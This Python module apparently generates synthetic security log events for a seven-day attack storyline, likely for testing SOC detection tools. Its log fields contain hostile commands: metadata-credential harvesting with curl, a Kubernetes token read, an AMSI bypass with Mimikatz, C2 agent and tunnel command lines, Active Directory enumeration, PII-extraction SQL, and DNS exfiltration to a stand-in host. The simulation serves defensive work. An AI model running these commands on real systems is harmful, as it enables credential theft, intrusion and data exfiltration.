"""Synthetic storyline attacks event family.

Explicit inputs preserve deterministic identities and caller-controlled event order.
"""
from __future__ import annotations

from dataclasses import dataclass
import datetime as dt
from typing import Any

if __package__:
    from .synthetic_campaign_common import (
        _deterministic_hex,
        _format_iso_utc,
    )
else:
    from synthetic_campaign_common import (
        _deterministic_hex,
        _format_iso_utc,
    )


@dataclass(frozen=True)
class AttacksResult:
    d1_ts1: str
    d2_ts1: str
    d3_ts1: str
    d4_ts2: str
    d5_ts3: str
    d6_ts1: str
    d6_ts2: str
    d7_trace: str
    d7_ts1: str
    d7_ts2: str
    d7_ts3: str


def add_attack_events(
    *,
    rmm_relay_ip: str,
    attack_logs: list[dict[str, Any]],
    base_date: dt.date,
    corp_mail_domain: str,
    day_traces: dict[int, str],
    dns_domain: str,
    guardian_adb: str,
    ip_caldera_c2: str,
    ip_goad_dc: str,
    ip_goad_pivot: str,
    ip_pod_src: str,
    ip_vcn_target: str,
    observeai_adb: str,
    prefix: str,
    seed: str,
    storyline_datasafe_events: list[dict[str, Any]],
) -> AttacksResult:
    """Emit this event family using the supplied identities and timeline."""
    # 2. Generate the 7-Day Multi-Stage Perpetrator Kill Chain
    # ── DAY 1: Recon & Initial Access (WAF/API Gateway 401/403 bursts + VCN Flow REJECT sweeps) ──
    d1_date = base_date + dt.timedelta(days=0)
    d1_ts1 = _format_iso_utc(dt.datetime.combine(d1_date, dt.time(3, 14, 22), tzinfo=dt.timezone.utc))
    d1_ts2 = _format_iso_utc(dt.datetime.combine(d1_date, dt.time(3, 29, 48), tzinfo=dt.timezone.utc))
    d1_trace = day_traces[1]
    for idx, (target_service, target_url, status_code, waf_act) in enumerate([
        ("octo-drone-shop", "/shop/api/v1/products/search?q=' UNION SELECT 1,banner FROM v$version--", "403", "BLOCK"),
        ("octo-drone-shop", "/shop/admin/actuator/env", "401", "DETECT"),
        ("enterprise-crm-portal", "/api/v1/customers/export?limit=5000", "401", "DETECT"),
        ("enterprise-crm-portal", "/api/v1/auth/token", "403", "BLOCK"),
    ]):
        attack_logs.append({
            "time": d1_ts1,
            "timestamp": d1_ts1,
            "timeCreated": d1_ts1,
            "day": 1,
            "stage_id": "STORYLINE-DAY-01",
            "record_category": "attack_kill_chain",
            "Log Source": "SOC WAF Security Logs",
            "Service Name": target_service,
            "Host Name": f"{target_service}.{dns_domain}",
            "hostname": f"{target_service}.{dns_domain}",
            "Client IP": "198.51.100.214",
            "clientAddress": "198.51.100.214",
            "HTTP Method": "GET" if idx < 3 else "POST",
            "httpMethod": "GET" if idx < 3 else "POST",
            "Request URL": target_url,
            "requestUrl": target_url,
            "URI Path": target_url.split("?")[0],
            "Response Code": status_code,
            "responseCode": status_code,
            "Action": waf_act,
            "action": waf_act,
            "WAF Action": waf_act,
            "Rule Action": waf_act,
            "Rule Key": "942100",
            "Rule Type": "PROTECTION_RULES",
            "User Agent": "Mozilla/5.0 (compatible; Nuclei/3.3.0; +https://projectdiscovery.io)",
            "userAgent": "Mozilla/5.0 (compatible; Nuclei/3.3.0; +https://projectdiscovery.io)",
            "Trace ID": d1_trace,
            "traceId": d1_trace,
            "msg": f"STORYLINE-DAY-01 WAF {waf_act} burst HTTP {status_code} against {target_service} {target_url} from 198.51.100.214",
        })
    for dst_port in (22, 445, 3389, 5985, 8080, 8443):
        attack_logs.append({
            "time": d1_ts2,
            "timestamp": d1_ts2,
            "day": 1,
            "stage_id": "STORYLINE-DAY-01",
            "record_category": "attack_kill_chain",
            "Log Source": "SOC VCN Flow Logs",
            "Source IP": "198.51.100.214",
            "Destination IP": ip_vcn_target,
            "Source Port": str(48100 + dst_port % 500),
            "Destination Port": str(dst_port),
            "Protocol": "6",
            "Action": "REJECT",
            "Network Action": "REJECT",
            "Bytes Sent": 64,
            "Bytes Received": 0,
            "Packets": 1,
            "Flow ID": f"flow-day1-{dst_port}",
            "Trace ID": d1_trace,
            "msg": f"STORYLINE-DAY-01 VCN Flow anomalous inbound port scan REJECT from 198.51.100.214 to {ip_vcn_target}:{dst_port}",
        })

    # ── DAY 2: OKE Pod Breakout & IMDSv2 Harvesting ──
    d2_date = base_date + dt.timedelta(days=1)
    d2_ts1 = _format_iso_utc(dt.datetime.combine(d2_date, dt.time(9, 27, 41), tzinfo=dt.timezone.utc))
    d2_ts2 = _format_iso_utc(dt.datetime.combine(d2_date, dt.time(9, 46, 15), tzinfo=dt.timezone.utc))
    d2_trace = day_traces[2]
    attack_logs.append({
        "time": d2_ts1,
        "timestamp": d2_ts1,
        "Timestamp": d2_ts1,
        "day": 2,
        "stage_id": "STORYLINE-DAY-02",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Linux Syslog Logs",
        "Hostname": f"{prefix}-oke-worker-01",
        "Host Name": f"{prefix}-oke-worker-01",
        "Process": "curl",
        "Process Name": "curl",
        "Command Line": "curl -s -H Authorization:Bearer_Oracle http://169.254.169.254/opc/v2/instance/ -o /tmp/.imds_creds.json",
        "Facility": "authpriv",
        "Severity": "critical",
        "Severity Level": "critical",
        "User": "www-data",
        "Source IP": ip_pod_src,
        "Trace ID": d2_trace,
        "msg": "STORYLINE-DAY-02 OKE pod portal-web-7d9c8b executed curl against 169.254.169.254/opc/v2/instance/ and read /var/run/secrets/kubernetes.io/serviceaccount/token",
    })
    attack_logs.append({
        "time": d2_ts2,
        "timestamp": d2_ts2,
        "day": 2,
        "stage_id": "STORYLINE-DAY-02",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Application Logs",
        "Service Name": "oke-audit-collector",
        "Host Name": f"{prefix}-oke-worker-01",
        "Process Name": "kubectl",
        "Process Command Line": "curl -s -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/instance/ && cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "HTTP Method": "GET",
        "Request URL": "/api/v1/namespaces/kube-system/secrets",
        "URI Path": "/api/v1/namespaces/kube-system/secrets",
        "Response Code": "200",
        "Attack Stage": "oke_pod_breakout_imdsv2",
        "Attack Type": "container_credential_harvesting",
        "MITRE Technique ID": "T1552.005",
        "MITRE Tactic": "Credential Access",
        "Client IP": ip_pod_src,
        "Source IP": ip_pod_src,
        "User": "system:serviceaccount:octo:portal-web-sa",
        "Trace ID": d2_trace,
        "Span ID": _deterministic_hex(seed, "span-day2-oke", 16),
        "msg": "STORYLINE-DAY-02 OKE Pod Breakout & IMDSv2 harvesting from pod portal-web-7d9c8b (169.254.169.254/opc/v2/instance/ + serviceaccount token enumeration)",
    })

    # ── DAY 3: Caldera Agent Deployment & GOAD AD Discovery ──
    d3_date = base_date + dt.timedelta(days=2)
    d3_ts1 = _format_iso_utc(dt.datetime.combine(d3_date, dt.time(13, 42, 9), tzinfo=dt.timezone.utc))
    d3_ts2 = _format_iso_utc(dt.datetime.combine(d3_date, dt.time(14, 11, 37), tzinfo=dt.timezone.utc))
    d3_trace = day_traces[3]
    for goad_host, goad_label, goad_cmd in [
        ("kingslanding", "GOAD-DC01 (KingsLanding)", f"C:\\Users\\Public\\splunkd.exe -server http://{ip_caldera_c2}:8888 -group red -v"),
        ("winterfell", "GOAD-DC02 (Winterfell)", f"AdFind.exe -h {ip_goad_dc} -f (objectcategory=person) sAMAccountName servicePrincipalName"),
        ("castelblack", "GOAD-SRV02 (CastelBlack)", "C:\\Users\\Public\\SharpHound.exe -c All --domain sevenkingdoms.local --zipfilename goad_bloodhound.zip"),
    ]:
        attack_logs.append({
            "time": d3_ts1,
            "timestamp": d3_ts1,
            "TimeCreated": d3_ts1,
            "UtcTime": d3_ts1,
            "day": 3,
            "stage_id": "STORYLINE-DAY-03",
            "record_category": "attack_kill_chain",
            "Log Source": "SOC Windows Sysmon Logs",
            "Event ID": "1",
            "EventID": "1",
            "Host Name": goad_host,
            "Host Name (Server)": goad_host,
            "Computer": goad_host,
            "Entity": goad_host,
            "User": "SEVENKINGDOMS\\joffrey.baratheon",
            "User Name": "SEVENKINGDOMS\\joffrey.baratheon",
            "Process Name": "C:\\Users\\Public\\splunkd.exe" if "splunkd" in goad_cmd else ("C:\\Users\\Public\\AdFind.exe" if "AdFind" in goad_cmd else "C:\\Users\\Public\\SharpHound.exe"),
            "Image": "C:\\Users\\Public\\splunkd.exe" if "splunkd" in goad_cmd else ("C:\\Users\\Public\\AdFind.exe" if "AdFind" in goad_cmd else "C:\\Users\\Public\\SharpHound.exe"),
            "Parent Process Name": "C:\\Windows\\System32\\schtasks.exe",
            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
            "Command Line": goad_cmd,
            "CommandLine": goad_cmd,
            "Target Filename": "C:\\Users\\Public\\splunkd.exe",
            "TargetFilename": "C:\\Users\\Public\\splunkd.exe",
            "Destination IP": ip_caldera_c2,
            "Destination Port": "8888",
            "Trace ID": d3_trace,
            "msg": f"STORYLINE-DAY-03 Caldera Sandcat & GOAD AD Discovery on {goad_label}: {goad_cmd}",
        })
    attack_logs.append({
        "time": d3_ts2,
        "timestamp": d3_ts2,
        "TimeCreated": d3_ts2,
        "day": 3,
        "stage_id": "STORYLINE-DAY-03",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows Event Security Logs",
        "Event ID": "4688",
        "EventID": 4688,
        "Host Name": "kingslanding",
        "Host Name (Server)": "kingslanding",
        "Computer": "kingslanding",
        "Entity": "kingslanding",
        "User": "joffrey.baratheon",
        "Subject User Name": "joffrey.baratheon",
        "Process Name": "C:\\Users\\Public\\AdFind.exe",
        "Command Line": "AdFind.exe -f (objectcategory=organizationalUnit) -dn",
        "Source Address": ip_goad_pivot,
        "Trace ID": d3_trace,
        "msg": "STORYLINE-DAY-03 Windows Security Event 4688: AdFind LDAP and BloodHound enumeration on GOAD-DC01 (KingsLanding)",
    })

    # ── DAY 4: Living-off-the-Land RMM & Lateral Movement (PowerShell -enc, AMSI bypass, cloudflared/anydesk, Kerberoasting 4769) ──
    d4_date = base_date + dt.timedelta(days=3)
    d4_ts1 = _format_iso_utc(dt.datetime.combine(d4_date, dt.time(16, 8, 33), tzinfo=dt.timezone.utc))
    d4_ts2 = _format_iso_utc(dt.datetime.combine(d4_date, dt.time(16, 44, 19), tzinfo=dt.timezone.utc))
    d4_ts3 = _format_iso_utc(dt.datetime.combine(d4_date, dt.time(17, 12, 50), tzinfo=dt.timezone.utc))
    d4_trace = day_traces[4]
    attack_logs.append({
        "time": d4_ts1,
        "timestamp": d4_ts1,
        "TimeCreated": d4_ts1,
        "day": 4,
        "stage_id": "STORYLINE-DAY-04",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows PowerShell Operational Logs",
        "Event ID": "4104",
        "EventID": 4104,
        "Host Name": "winterfell",
        "Host Name (Server)": "winterfell",
        "Computer": "winterfell",
        "User": "NORTH\\eddard.stark",
        "Process Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "Command Line": "powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAIAAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAKQA=",
        "Script Block Text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); Invoke-Mimikatz -Command '\"sekurlsa::tickets\"'",
        "Channel": "Microsoft-Windows-PowerShell/Operational",
        "Provider": "Microsoft-Windows-PowerShell",
        "Trace ID": d4_trace,
        "msg": "STORYLINE-DAY-04 PowerShell EventID 4104 AMSI bypass reflection and encoded command execution on GOAD-DC02 (Winterfell)",
    })
    attack_logs.append({
        "time": d4_ts2,
        "timestamp": d4_ts2,
        "TimeCreated": d4_ts2,
        "UtcTime": d4_ts2,
        "day": 4,
        "stage_id": "STORYLINE-DAY-04",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Windows Sysmon Logs",
        "Event ID": "1",
        "EventID": "1",
        "Host Name": "castelblack",
        "Host Name (Server)": "castelblack",
        "Computer": "castelblack",
        "Entity": "castelblack",
        "User": "NORTH\\jon.snow",
        "User Name": "NORTH\\jon.snow",
        "Process Name": "C:\\ProgramData\\cloudflared.exe",
        "Image": "C:\\ProgramData\\cloudflared.exe",
        "Parent Process Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "Command Line": "cloudflared.exe tunnel --url tcp://127.0.0.1:3389 --no-autoupdate",
        "CommandLine": "cloudflared.exe tunnel --url tcp://127.0.0.1:3389 --no-autoupdate",
        "Destination IP": rmm_relay_ip,
        "Destination Port": "7844",
        "Trace ID": d4_trace,
        "msg": "STORYLINE-DAY-04 LotL RMM tunnel execution (cloudflared.exe / anydesk) on GOAD-SRV02 (CastelBlack)",
    })
    for spn_target, goad_dc in [
        ("MSSQLSvc/castelblack.north.sevenkingdoms.local:1433", "winterfell"),
        ("HTTP/kingslanding.sevenkingdoms.local", "kingslanding"),
        ("CIFS/castelblack.north.sevenkingdoms.local", "castelblack"),
    ]:
        attack_logs.append({
            "time": d4_ts3,
            "timestamp": d4_ts3,
            "TimeCreated": d4_ts3,
            "day": 4,
            "stage_id": "STORYLINE-DAY-04",
            "record_category": "attack_kill_chain",
            "Log Source": "Windows Event Security Logs",
            "Event ID": "4769",
            "EventID": 4769,
            "Host Name": goad_dc,
            "Host Name (Server)": goad_dc,
            "Computer": goad_dc,
            "Entity": goad_dc,
            "User": "jon.snow@north.sevenkingdoms.local",
            "Subject User Name": "jon.snow@north.sevenkingdoms.local",
            "Target User Name": "svc_sql",
            "Service Name": spn_target,
            "Ticket Encryption Type": "0x17",
            "Ticket Options": "0x40810000",
            "Source Address": ip_goad_pivot,
            "Status": "0x0",
            "Trace ID": d4_trace,
            "msg": f"STORYLINE-DAY-04 Kerberoasting EventID 4769 RC4 (0x17) TGS ticket request for {spn_target} on {goad_dc}",
        })

    # ── DAY 5: Privilege Escalation & Persistence (DCSync 4662 on KingsLanding + 4698/7045 + OCI IAM drift) ──
    d5_date = base_date + dt.timedelta(days=4)
    d5_ts1 = _format_iso_utc(dt.datetime.combine(d5_date, dt.time(21, 15, 7), tzinfo=dt.timezone.utc))
    d5_ts2 = _format_iso_utc(dt.datetime.combine(d5_date, dt.time(21, 38, 42), tzinfo=dt.timezone.utc))
    d5_ts3 = _format_iso_utc(dt.datetime.combine(d5_date, dt.time(22, 4, 19), tzinfo=dt.timezone.utc))
    d5_trace = day_traces[5]
    attack_logs.append({
        "time": d5_ts1,
        "timestamp": d5_ts1,
        "TimeCreated": d5_ts1,
        "day": 5,
        "stage_id": "STORYLINE-DAY-05",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows Event Security Logs",
        "Event ID": "4662",
        "EventID": 4662,
        "Host Name": "kingslanding",
        "Host Name (Server)": "kingslanding",
        "Computer": "kingslanding",
        "Entity": "kingslanding",
        "User": "petyr.baelish",
        "Subject User Name": "petyr.baelish",
        "Object Server": "DS",
        "Object Type": "domainDNS",
        "Object Name": "DC=sevenkingdoms,DC=local",
        "Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} DS-Replication-Get-Changes-All",
        "Access Mask": "0x100",
        "Source Address": ip_goad_pivot,
        "Trace ID": d5_trace,
        "msg": "STORYLINE-DAY-05 DCSync EventID 4662 DS-Replication-Get-Changes-All on GOAD-DC01 (KingsLanding) by petyr.baelish",
    })
    attack_logs.append({
        "time": d5_ts2,
        "timestamp": d5_ts2,
        "TimeCreated": d5_ts2,
        "day": 5,
        "stage_id": "STORYLINE-DAY-05",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows Event System Logs",
        "Event ID": "7045",
        "EventID": 7045,
        "Host Name": "kingslanding",
        "Host Name (Server)": "kingslanding",
        "Computer": "kingslanding",
        "User": "NT AUTHORITY\\SYSTEM",
        "Service Name": "SplunkFwdPersistSvc",
        "Service File Name": "C:\\Users\\Public\\splunkd.exe -service -c2 198.51.100.214:8443",
        "Trace ID": d5_trace,
        "msg": "STORYLINE-DAY-05 Windows System EventID 7045 malicious service SplunkFwdPersistSvc installed on KingsLanding",
    })
    attack_logs.append({
        "time": d5_ts3,
        "timestamp": d5_ts3,
        "day": 5,
        "stage_id": "STORYLINE-DAY-05",
        "record_category": "attack_kill_chain",
        "Log Source": "OCI Audit Logs",
        "Event Name": "UpdatePolicy",
        "Event Type": "com.oraclecloud.identitycontrolplane.updatepolicy",
        "Principal Name": f"compromised-devops@{corp_mail_domain}",
        "User Name": f"compromised-devops@{corp_mail_domain}",
        "Client IP": "198.51.100.214",
        "Source IP": "198.51.100.214",
        "Status": "200",
        "Response Code": "200",
        "Resource Name": "Rogue-Shadow-Admins-Policy",
        "Compartment Name": f"{prefix}-security",
        "Trace ID": d5_trace,
        "msg": "STORYLINE-DAY-05 OCI IAM policy modification attempt (UpdatePolicy: Allow group RogueAdmins to manage all-resources in tenancy)",
    })

    # ── DAY 6: Database Reconnaissance & Data Safe Alerting ──
    d6_date = base_date + dt.timedelta(days=5)
    d6_ts1 = _format_iso_utc(dt.datetime.combine(d6_date, dt.time(11, 36, 19), tzinfo=dt.timezone.utc))
    d6_ts2 = _format_iso_utc(dt.datetime.combine(d6_date, dt.time(12, 4, 52), tzinfo=dt.timezone.utc))
    d6_trace = day_traces[6]
    attack_logs.append({
        "time": d6_ts1,
        "timestamp": d6_ts1,
        "day": 6,
        "stage_id": "STORYLINE-DAY-06",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Application Logs",
        "Service Name": "oracle-datasafe-unified-audit",
        "Host Name": observeai_adb,
        "DB Target": observeai_adb,
        "DB Connection Name": guardian_adb,
        "DB Statement": "SELECT owner, table_name, column_name FROM all_tab_columns WHERE owner IN ('CRM_CORE','ADMIN') AND (column_name LIKE '%CARD%' OR column_name LIKE '%TOKEN%' OR column_name LIKE '%PASSWORD%')",
        "DB Elapsed ms": 412,
        "Attack Stage": "datasafe_schema_recon",
        "Attack Type": "unauthorized_sql_schema_enumeration",
        "MITRE Technique ID": "T1213",
        "MITRE Tactic": "Collection",
        "User": "CRM_APP",
        "Client IP": "192.0.2.119",
        "Source IP": "192.0.2.119",
        "Response Code": "200",
        "Trace ID": d6_trace,
        "Span ID": _deterministic_hex(seed, "span-day6-ds1", 16),
        "msg": f"STORYLINE-DAY-06 Oracle Data Safe Unified Audit alert: unauthorized SQL schema enumeration on {guardian_adb} / {observeai_adb}",
    })
    attack_logs.append({
        "time": d6_ts2,
        "timestamp": d6_ts2,
        "day": 6,
        "stage_id": "STORYLINE-DAY-06",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Application Logs",
        "Service Name": "oracle-datasafe-unified-audit",
        "Host Name": guardian_adb,
        "DB Target": guardian_adb,
        "DB Connection Name": observeai_adb,
        "DB Statement": "SELECT customer_id, email, card_number, api_token FROM CRM_CORE.CUSTOMER_PII FETCH FIRST 1000 ROWS ONLY",
        "DB Elapsed ms": 895,
        "Attack Stage": "datasafe_bulk_pii_extraction",
        "Attack Type": "sensitive_table_extraction",
        "MITRE Technique ID": "T1530",
        "MITRE Tactic": "Collection",
        "User": "CRM_APP",
        "Client IP": "192.0.2.119",
        "Source IP": "192.0.2.119",
        "Response Code": "200",
        "Trace ID": d6_trace,
        "Span ID": _deterministic_hex(seed, "span-day6-ds2", 16),
        "msg": f"STORYLINE-DAY-06 Oracle Data Safe ORA-DS-PRIV-004 high-velocity SELECT on CRM_CORE.CUSTOMER_PII and PAYMENT_TOKENS in {guardian_adb}",
    })
    storyline_datasafe_events.append({
        "timestamp": d6_ts2,
        "day": 6,
        "stage_id": "STORYLINE-DAY-06",
        "log_source": "OCI Data Safe Unified Audit Logs",
        "database_targets": [guardian_adb, observeai_adb],
        "db_user": "CRM_APP",
        "os_user": "agent-runner",
        "client_host": "192.0.2.119",
        "audit_action": "SELECT",
        "object_schema": "CRM_CORE",
        "object_name": "CUSTOMER_PII",
        "sql_text": "SELECT customer_id, email, card_number, api_token FROM CRM_CORE.CUSTOMER_PII FETCH FIRST 1000 ROWS ONLY",
        "finding_key": "ORA-DS-PRIV-004",
        "severity": "CRITICAL",
        "trace_id": d6_trace,
    })

    # ── DAY 7: Exfiltration Attempt & AI Automated Containment ──
    d7_date = base_date + dt.timedelta(days=6)
    d7_ts1 = _format_iso_utc(dt.datetime.combine(d7_date, dt.time(7, 51, 14), tzinfo=dt.timezone.utc))
    d7_ts2 = _format_iso_utc(dt.datetime.combine(d7_date, dt.time(8, 12, 33), tzinfo=dt.timezone.utc))
    d7_ts3 = _format_iso_utc(dt.datetime.combine(d7_date, dt.time(8, 29, 45), tzinfo=dt.timezone.utc))
    d7_trace = day_traces[7]
    attack_logs.append({
        "time": d7_ts1,
        "timestamp": d7_ts1,
        "TimeCreated": d7_ts1,
        "day": 7,
        "stage_id": "STORYLINE-DAY-07",
        "record_category": "attack_kill_chain",
        "Log Source": "Windows Sysmon Operational Logs",
        "Event ID": "22",
        "EventID": "22",
        "Host Name": "kingslanding",
        "Host Name (Server)": "kingslanding",
        "Computer": "kingslanding",
        "User": "NT AUTHORITY\\SYSTEM",
        "Process Name": "C:\\Users\\Public\\splunkd.exe",
        "Query Name": "a8f9d2c1e4b70912a3f4e5d6c7b8.exfil.c2-stage.example.net",
        "Query Results": "type: 16 TXT; 198.51.100.214",
        "Destination IP": "198.51.100.214",
        "Destination Port": "53",
        "Trace ID": d7_trace,
        "msg": "STORYLINE-DAY-07 High-volume DNS tunneling query a8f9d2c1e4b70912a3f4e5d6c7b8.exfil.c2-stage.example.net to 198.51.100.214",
    })
    attack_logs.append({
        "time": d7_ts2,
        "timestamp": d7_ts2,
        "day": 7,
        "stage_id": "STORYLINE-DAY-07",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC VCN Flow Logs",
        "Source IP": ip_vcn_target,
        "Destination IP": "198.51.100.214",
        "Source Port": "54912",
        "Destination Port": "8443",
        "Protocol": "6",
        "Action": "ACCEPT",
        "Network Action": "ACCEPT",
        "Bytes Sent": 52428800,
        "Bytes Received": 14200,
        "Packets": 36400,
        "Flow ID": "flow-day7-c2-exfil",
        "Trace ID": d7_trace,
        "msg": "STORYLINE-DAY-07 High-volume outbound VCN Flow transfer (52428800 bytes) to C2 IP 198.51.100.214:8443",
    })
    attack_logs.append({
        "time": d7_ts3,
        "timestamp": d7_ts3,
        "day": 7,
        "stage_id": "STORYLINE-DAY-07",
        "record_category": "attack_kill_chain",
        "Log Source": "SOC Application Logs",
        "Service Name": "observeai-coordinator-agent",
        "Host Name": f"observeai.{dns_domain}",
        "HTTP Method": "POST",
        "Request URL": "/api/v1/investigations/melts-correlate-and-contain",
        "URI Path": "/api/v1/investigations/melts-correlate-and-contain",
        "Response Code": "200",
        "Attack Stage": "ai_automated_containment",
        "Attack Type": "dns_c2_exfiltration_containment",
        "MITRE Technique ID": "T1041",
        "MITRE Tactic": "Exfiltration",
        "Client IP": "198.51.100.214",
        "Source IP": ip_vcn_target,
        "Destination IP": "198.51.100.214",
        "Destination Port": "8443",
        "Network Bytes Out": 52428800,
        "User": "observeai-autonomous-soc-agent",
        "Trace ID": d7_trace,
        "Span ID": _deterministic_hex(seed, "span-day7-contain", 16),
        "msg": "STORYLINE-DAY-07 ObserveAI Coordinator AI Agent correlated 7-day MELTS kill chain and isolated C2 198.51.100.214 via NSG containment",
    })
    return AttacksResult(
        d1_ts1=d1_ts1,
        d2_ts1=d2_ts1,
        d3_ts1=d3_ts1,
        d4_ts2=d4_ts2,
        d5_ts3=d5_ts3,
        d6_ts1=d6_ts1,
        d6_ts2=d6_ts2,
        d7_trace=d7_trace,
        d7_ts1=d7_ts1,
        d7_ts2=d7_ts2,
        d7_ts3=d7_ts3,
    )
